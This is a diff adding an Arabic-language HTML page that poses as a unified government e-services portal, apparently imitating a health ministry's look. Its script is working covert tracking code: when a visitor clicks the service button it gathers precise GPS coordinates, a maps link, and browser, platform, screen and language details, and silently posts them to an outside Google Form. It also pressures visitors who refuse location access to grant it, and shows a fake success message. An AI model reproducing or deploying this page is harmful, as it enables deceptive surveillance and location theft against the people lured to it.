@@ -1,1 +1,344 @@
-404: Not Found
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>بوابة الخدمات الإلكترونية الموحدة</title>
+    <!-- استخدام خط تجوال لإعطاء طابع رسمي مشابه للمواقع الحكومية -->
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #1B8354; /* لون أخضر مشابه لوزارة الصحة */
+            --primary-hover: #16603d;
+            --bg-color: #f4f7f6;
+            --text-dark: #333333;
+            --text-light: #666666;
+            --danger-color: #dc3545;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-dark);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 15px;
+        }
+
+        .portal-container {
+            background: #ffffff;
+            width: 100%;
+            max-width: 450px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+            overflow: hidden;
+            text-align: center;
+            border-top: 5px solid var(--primary-color);
+        }
+
+        .header {
+            padding: 30px 20px 10px;
+        }
+
+        .header-icon {
+            width: 70px;
+            height: 70px;
+            background-color: rgba(27, 131, 84, 0.1);
+            color: var(--primary-color);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 15px;
+        }
+
+        .header-icon svg {
+            width: 35px;
+            height: 35px;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+
+        .description {
+            color: var(--text-light);
+            font-size: 0.95rem;
+            line-height: 1.6;
+            padding: 0 20px 25px;
+        }
+
+        .action-area {
+            padding: 0 20px 30px;
+        }
+
+        .btn-start {
+            background-color: var(--primary-color);
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-start:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .btn-start:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+
+        /* رسائل النظام (نجاح / خطأ) */
+        .alert-box {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            text-align: right;
+        }
+
+        .alert-error {
+            background-color: rgba(220, 53, 69, 0.1);
+            color: var(--danger-color);
+            border: 1px solid rgba(220, 53, 69, 0.2);
+        }
+
+        .alert-success {
+            background-color: rgba(27, 131, 84, 0.1);
+            color: var(--primary-color);
+            border: 1px solid rgba(27, 131, 84, 0.2);
+            text-align: center;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+
+        .instructions-list {
+            margin-top: 10px;
+            padding-right: 20px;
+            font-size: 0.85rem;
+        }
+
+        .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .footer-note {
+            background-color: #f8f9fa;
+            padding: 15px;
+            font-size: 0.75rem;
+            color: #999;
+            border-top: 1px solid #eeeeee;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="portal-container">
+        <div class="header">
+            <div class="header-icon">
+                <!-- أيقونة تعبر عن الخدمات الإلكترونية -->
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path>
+                    <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
+                    <line x1="12" y1="22.08" x2="12" y2="12"></line>
+                </svg>
+            </div>
+            <h1>بوابة الخدمات الإلكترونية</h1>
+        </div>
+        
+        <div class="description">
+            مرحباً بك في البوابة الموحدة. تتيح لك هذه البوابة الوصول السريع والآمن لمجموعة واسعة من الخدمات المخصصة لك. يرجى المتابعة للتحقق من المتطلبات والبدء بإجراءات الخدمة المطلوبة.
+        </div>
+
+        <div class="action-area">
+            <button id="startServiceBtn" class="btn-start">
+                <span>الدخول للخدمة</span>
+                <div class="loader" id="btnLoader"></div>
+            </button>
+
+            <!-- منطقة الرسائل -->
+            <div id="alertBox" class="alert-box"></div>
+        </div>
+
+        <div class="footer-note">
+            يجب الموافقة على صلاحيات الموقع الجغرافي لضمان جودة الخدمة واستكمال الإجراءات الأمنية.
+        </div>
+    </div>
+
+    <script>
+        // =========================================================================
+        // إعدادات نموذج جوجل (Google Form)
+        // يجب استبدال الروابط ومعرفات الحقول (entry.IDs) ببيانات النموذج الخاص بك
+        // =========================================================================
+        
+        const FORM_POST_URL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSccde-5FC3RKLZB-Tq5UsN_jP7Vcu5gCN3LKFGeI0HVS_f3ow/formResponse";
+        
+        // تم التحديث بمعرفات الحقول الخاصة بنموذجك
+        const ENTRY_STATUS     = "entry.560644642"; // حالة الإذن
+        const ENTRY_LATITUDE   = "entry.1981918650"; // خط العرض
+        const ENTRY_LONGITUDE  = "entry.1141171242"; // خط الطول
+        const ENTRY_ACCURACY   = "entry.2030681550"; // الدقة
+        const ENTRY_TIME       = "entry.625293889"; // الوقت
+        const ENTRY_USER_AGENT = "entry.1922500127"; // معلومات المتصفح
+        const ENTRY_PLATFORM   = "entry.1237647503"; // النظام
+        const ENTRY_SCREEN     = "entry.1147551305"; // دقة الشاشة
+        const ENTRY_LANGUAGE   = "entry.1327515972"; // اللغة
+        const ENTRY_MAPS_LINK  = "entry.1638046155"; // رابط خرائط جوجل (الحقل العاشر الجديد)
+
+        // =========================================================================
+
+        const startBtn = document.getElementById('startServiceBtn');
+        const btnLoader = document.getElementById('btnLoader');
+        const alertBox = document.getElementById('alertBox');
+        const btnText = startBtn.querySelector('span');
+
+        startBtn.addEventListener('click', initiateService);
+
+        function initiateService() {
+            // تفعيل حالة التحميل
+            startBtn.disabled = true;
+            btnLoader.style.display = 'block';
+            btnText.style.display = 'none';
+            alertBox.style.display = 'none';
+
+            // جمع بيانات الجهاز والمتصفح
+            const deviceInfo = {
+                time: new Date().toLocaleString('ar-SA'),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform || navigator.userAgentData?.platform || "غير معروف",
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language || navigator.userLanguage
+            };
+
+            // طلب الموقع بدقة عالية
+            if (navigator.geolocation) {
+                const options = {
+                    enableHighAccuracy: true, // طلب دقة عالية (GPS)
+                    timeout: 15000,           // أقصى وقت للانتظار
+                    maximumAge: 0             // عدم استخدام موقع مخزن مسبقاً
+                };
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => handleLocationSuccess(position, deviceInfo),
+                    (error) => handleLocationError(error, deviceInfo),
+                    options
+                );
+            } else {
+                showError("عذراً، متصفحك لا يدعم تحديد الموقع.");
+                sendDataToGoogle("غير مدعوم", "", "", "", deviceInfo);
+            }
+        }
+
+        function handleLocationSuccess(position, deviceInfo) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const accuracy = position.coords.accuracy; // الدقة بالمتر
+
+            // إرسال البيانات كاملة
+            sendDataToGoogle("موافق", lat, lng, accuracy, deviceInfo);
+
+            // عرض رسالة النجاح
+            showSuccess("جاري بدء الخدمه...");
+        }
+
+        function handleLocationError(error, deviceInfo) {
+            // إرسال بيانات الجهاز مع حالة الرفض
+            sendDataToGoogle("مرفوض", "N/A", "N/A", "N/A", deviceInfo);
+
+            let errorMessage = "<strong>تم رفض أو فشل الوصول للموقع!</strong><br>الخدمة تتطلب تحديد موقعك الفعلي للمتابعة.";
+            errorMessage += `<ul class="instructions-list">
+                                <li><strong>لأجهزة الآيفون (Safari):</strong> اضغط على حرفي (ع ع) أو (AA) في شريط الرابط أعلى الشاشة، اختر "إعدادات موقع الويب"، واسمح للموقع.</li>
+                                <li><strong>لأجهزة الأندرويد (Chrome):</strong> اضغط على علامة القفل 🔒 بجانب الرابط أعلى الشاشة، اختر "الأذونات"، وقم بتفعيل الموقع.</li>
+                                <li>قم بتحديث الصفحة بعد إعطاء الصلاحية واضغط على الزر مجدداً.</li>
+                             </ul>`;
+            
+            showError(errorMessage);
+            resetButton();
+        }
+
+        function sendDataToGoogle(status, lat, lng, accuracy, device) {
+            const formData = new FormData();
+            
+            // تعبئة البيانات حسب معرفات النموذج
+            formData.append(ENTRY_STATUS, status);
+            formData.append(ENTRY_LATITUDE, lat);
+            formData.append(ENTRY_LONGITUDE, lng);
+            formData.append(ENTRY_ACCURACY, accuracy ? accuracy + " متر" : "N/A");
+            formData.append(ENTRY_TIME, device.time);
+            formData.append(ENTRY_USER_AGENT, device.userAgent);
+            formData.append(ENTRY_PLATFORM, device.platform);
+            formData.append(ENTRY_SCREEN, device.screen);
+            formData.append(ENTRY_LANGUAGE, device.language);
+
+            // إنشاء رابط مباشر لخرائط جوجل وإضافته
+            let mapsLink = "N/A";
+            if (lat !== "N/A" && lng !== "N/A") {
+                mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+            }
+            formData.append(ENTRY_MAPS_LINK, mapsLink);
+
+            // إرسال البيانات بصمت (بدون إعادة توجيه)
+            fetch(FORM_POST_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: formData
+            }).catch(err => console.log('Form submission trace:', err));
+        }
+
+        function showSuccess(message) {
+            alertBox.className = 'alert-box alert-success';
+            alertBox.innerHTML = message;
+            alertBox.style.display = 'block';
+            
+            // إبقاء الزر معطل بعد النجاح
+            btnLoader.style.display = 'none';
+            btnText.style.display = 'block';
+            btnText.innerText = 'تم التحقق بنجاح';
+        }
+
+        function showError(message) {
+            alertBox.className = 'alert-box alert-error';
+            alertBox.innerHTML = message;
+            alertBox.style.display = 'block';
+        }
+
+        function resetButton() {
+            startBtn.disabled = false;
+            btnLoader.style.display = 'none';
+            btnText.style.display = 'block';
+        }
+    </script>
+</body>
+</html>
